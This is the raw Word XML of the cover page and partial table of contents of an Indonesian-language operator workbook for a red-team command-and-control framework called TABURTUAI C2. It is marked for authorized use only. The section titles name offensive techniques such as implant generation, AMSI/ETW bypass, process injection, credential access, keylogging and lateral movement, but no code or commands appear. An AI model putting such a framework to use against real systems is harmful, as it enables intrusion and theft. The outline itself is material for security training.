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0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="72"/>
        </w:rPr>
        <w:t>TABURTUAI C2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:t>OPERATOR WORKBOOK</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Red Team Operations &amp; Adversary Simulation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="BBBBBB"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Version 2.0  ·  For Authorized Use Only</w:t>
      </w:r>
    </w:p>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0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="100"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>⚠  PERINGATAN: Dokumen ini bersifat RAHASIA. Digunakan hanya untuk authorized security testing, red team engagement dengan izin tertulis, dan pelatihan keamanan internal. Penggunaan di luar konteks tersebut adalah tindakan ilegal.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>DAFTAR ISI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Bagian</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Topik</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Hal.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Pendahuluan &amp; Arsitektur</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Setup &amp; Deployment Server</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Generate Implant (Agent)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Agent Management &amp; Checkin</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Command Execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>File Operations (Upload / Download)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Persistence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Process Management &amp; PPID Spoofing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Evasion &amp; Bypass (AMSI / ETW / Unhook)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>21</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Token Manipulation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Process Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>27</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Credential Access</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Reconnaissance (Screenshot &amp; Keylogger)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>33</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 14</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Network &amp; Pivoting</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>35</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Lateral Movement (WMI / WinRM / DCOM)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>39</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Advanced Transports (WS / DNS / DoH / ICMP)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>44</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 17</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Multi-Operator Team Server (RBAC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>47</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bagian 18</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6236"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
